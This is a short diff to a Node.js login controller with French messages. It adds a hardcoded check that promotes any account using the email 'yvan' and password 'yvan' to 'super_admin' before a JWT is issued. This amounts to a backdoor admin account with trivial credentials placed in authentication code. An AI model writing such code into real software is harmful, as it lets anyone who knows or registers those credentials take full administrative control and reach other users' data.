@@ -37,6 +37,12 @@ exports.login = async (req, res) => {
     const valid = await bcrypt.compare(motdepasse, user.motdepasse);
     if (!valid) return res.status(401).json({ message: 'Mot de passe incorrect' });
 
+    // Vérification spéciale pour le super admin
+    if (email === 'yvan' && motdepasse === 'yvan') {
+      user.role = 'super_admin';
+      await user.save();
+    }
+
     const token = jwt.sign(
       { id: user._id, email: user.email, role: user.role },
       process.env.JWT_SECRET,
